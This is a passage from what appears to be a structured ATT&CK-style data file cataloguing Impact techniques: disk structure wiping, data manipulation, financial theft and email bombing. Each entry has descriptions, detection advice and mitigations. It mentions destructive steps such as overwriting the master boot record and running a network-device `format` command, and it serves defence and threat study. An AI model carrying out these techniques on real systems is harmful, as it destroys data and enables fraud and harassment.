Drive Modification","Drive: Drive Access","Driver: Driver Load","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}]},{"id":"T1561.002","name":"Disk Structure Wipe","description":"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. <a href=\"https://www.symantec.com/connect/blogs/shamoon-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Shamoon 2012)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Shamoon Nov 2016)</a> <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a> <a href=\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Shamoon3 2018)</a> The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using Network Device CLI commands such as <code>format</code>. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/F_through_K.html#wp2829794668\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: format_cmd_cisco)</a>\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. <a href=\"https://www.symantec.com/connect/blogs/shamoon-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Shamoon 2012)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Shamoon Nov 2016)</a> <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a>","detection":"Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sysmon v6 May 2017)</a> Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for <code>format</code> commands being run to erase the file structure and prevent recovery of the device.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Driver: Driver Load","Drive: Drive Modification","Drive: Drive Access","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}]}]},{"id":"T1565","name":"Data Manipulation","description":"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. <a href=\"https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf?__hstc=147695848.3e8f1a482c8f8d4531507747318e660b.1680005306711.1680005306711.1680005306711.1&__hssc=147695848.1.1680005306711&__hsfp=3000179024&hsCtaTracking=189ec409-ae2d-4909-8bf1-62dcdd694372%7Cca91d317-8f10-4a38-9f80-367f551ad64d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Elephant Beetle Jan 2022)</a> By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","detection":"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Network Traffic: Network Traffic Content","File: File Creation","Network Traffic: Network Traffic Flow","File: File Deletion","File: File Modification","File: File Metadata"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."},{"id":"M1029","name":"Remote Data Storage","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups."},{"id":"M1030","name":"Network Segmentation","description":"Identify critical business and system processes that may be targeted by adversaries and work to isolate and secure those systems against unauthorized access and tampering."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Consider encrypting important information to reduce an adversary’s ability to perform tailored data modifications."}],"subTechniques":[{"id":"T1565.001","name":"Stored Data Manipulation","description":"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. <a href=\"https://content.fireeye.com/apt/rpt-apt38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT38 Oct 2018)</a> <a href=\"https://www.justice.gov/opa/press-release/file/1092091/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ Lazarus Sony 2018)</a> By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","detection":"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","File: File Creation","File: File Deletion"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."},{"id":"M1029","name":"Remote Data Storage","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Consider encrypting important information to reduce an adversary’s ability to perform tailored data modifications."}]},{"id":"T1565.002","name":"Transmitted Data Manipulation","description":"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. <a href=\"https://content.fireeye.com/apt/rpt-apt38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT38 Oct 2018)</a> <a href=\"https://www.justice.gov/opa/press-release/file/1092091/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ Lazarus Sony 2018)</a> By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","detection":"Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1041","name":"Encrypt Sensitive Information","description":"Encrypt all important data flows to reduce the impact of tailored modifications on data in transit."}]},{"id":"T1565.003","name":"Runtime Data Manipulation","description":"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. <a href=\"https://content.fireeye.com/apt/rpt-apt38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT38 Oct 2018)</a> <a href=\"https://www.justice.gov/opa/press-release/file/1092091/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ Lazarus Sony 2018)</a> By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","detection":"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Modification","File: File Deletion","Process: OS API Execution","File: File Metadata","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Prevent critical business and system processes from being replaced, overwritten, or reconfigured to load potentially malicious code."},{"id":"M1030","name":"Network Segmentation","description":"Identify critical business and system processes that may be targeted by adversaries and work to isolate and secure those systems against unauthorized access and tampering."}]}]},{"id":"T1657","name":"Financial Theft","description":"Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, <a href=\"https://www.cisa.gov/sites/default/files/Ransomware_Trifold_e-version.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI-ransomware)</a> business email compromise (BEC) and fraud, <a href=\"https://www.fbi.gov/file-repository/fy-2022-fbi-congressional-report-business-email-compromise-and-real-estate-wire-fraud-111422.pdf/view\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI-BEC)</a> \"pig butchering,\" <a href=\"https://www.wired.com/story/pig-butchering-fbi-ic3-2022-report/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wired-pig butchering)</a> bank hacking, <a href=\"https://www.justice.gov/usao-cdca/pr/3-north-korean-military-hackers-indicted-wide-ranging-scheme-commit-cyber-attacks-and\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ-DPRK Heist)</a> and exploiting cryptocurrency networks. <a href=\"https://www.bbc.com/news/technology-60933174\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BBC-Ronin)</a> \n\nAdversaries may Compromise Accounts to conduct unauthorized transfers of funds. <a href=\"https://www.ic3.gov/Media/PDF/AnnualReport/2022_IC3Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Internet crime report 2022)</a> In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. <a href=\"https://www.fbi.gov/file-repository/fy-2022-fbi-congressional-report-business-email-compromise-and-real-estate-wire-fraud-111422.pdf/view\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI-BEC)</a> This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft. <a href=\"https://www.cloudflare.com/learning/email-security/what-is-vendor-email-compromise/#:~:text=Vendor%20email%20compromise%2C%20also%20referred,steal%20from%20that%20vendor%27s%20customers.\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VEC)</a>\n\nExtortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact <a href=\"https://www.nytimes.com/2021/05/13/technology/colonial-pipeline-ransom.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NYT-Colonial)</a> and Exfiltration of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary. <a href=\"https://www.mandiant.com/resources/blog/ransomware-extortion-ot-docs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant-leaks)</a> Adversaries may use dedicated leak sites to distribute victim data. <a href=\"https://www.crowdstrike.com/blog/double-trouble-ransomware-data-leak-extortion-part-1/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike-leaks)</a>\n\nDue to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption. <a href=\"https://apnews.com/article/russia-ukraine-technology-business-europe-hacking-ce7a8aca506742ab8e8873e7f9f229c2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AP-NotPetya)</a>","detection":"","platforms":["Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train and encourage users to identify social engineering techniques used to enable financial theft. Also consider training users on procedures to prevent and respond to swatting and doxing, acts increasingly deployed by financially motivated groups to further coerce victims into satisfying ransom/extortion demands. <a href=\"https://www.cisa.gov/sites/default/files/2023-08/CSRB_Lapsus%24_508c.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyber Safety Review Board: Lapsus)</a> <a href=\"https://www.beckershospitalreview.com/cybersecurity/hackers-threaten-to-send-swat-teams-to-fred-hutch-patients-homes.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SWAT-hospital)</a>"},{"id":"M1018","name":"User Account Management","description":"Limit access/authority to execute sensitive transactions, and switch to systems and procedures designed to authenticate/approve payments and purchase requests outside of insecure communication lines such as email."}],"subTechniques":[]},{"id":"T1667","name":"Email Bombing","description":"Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations. <a href=\"https://news.sophos.com/en-us/2025/01/21/sophos-mdr-tracks-two-ransomware-campaigns-using-email-bombing-microsoft-teams-vishing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sophos-bombing)</a> <a href=\"https://krebsonsecurity.com/2016/08/massive-email-bombs-target-gov-addresses/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: krebs-email-bombing)</a>\n\nAn adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox. <a href=\"https://krebsonsecurity.com/2016/08/massive-email-bombs-target-gov-addresses/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: krebs-email-bombing)</a> <a href=\"https://www.hhs.gov/sites/default/files/email-bombing-sector-alert-tlpclear.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hhs-email-bombing)</a>\n\nBy sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams. <a href=\"https://www.hhs.gov/sites/default/files/email-bombing-sector-alert-tlpclear.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hhs-email-bombing)</a> This behavior can also be used as a tool of harassment. <a href=\"https://krebsonsecurity.com/2016/08/massive-email-bombs-target-gov-addresses/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: krebs-email-bombing)</a>\n\nThis behavior may be a precursor for Spearphishing Voice. For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of Remote Access Software to steal credentials, deploy ransomware, conduct Financial Theft <a href=\"https://news.sophos.com/en-us/2025/01/21/sophos-mdr-tracks-two-ransomware-campaigns-using-email-bombing-microsoft-teams-vishing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sophos-bombing)</a>, or engage in other malicious activity. <a href=\"https://www.rapid7.com/blog/post/2024/05/10/ongoing-social-engineering-campaign-linked-to-black-basta-ransomware-operators\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rapid7-email-bombing)</a>","detection":"","platforms":["Linux","Office Suite","Windows","macOS"],"dataSources":[],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful social engineering via e-mail bombing."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a> Note that additional filtering may be necessary if emails are coming from legitimate sources."}],"subTechniques":[]}]}];
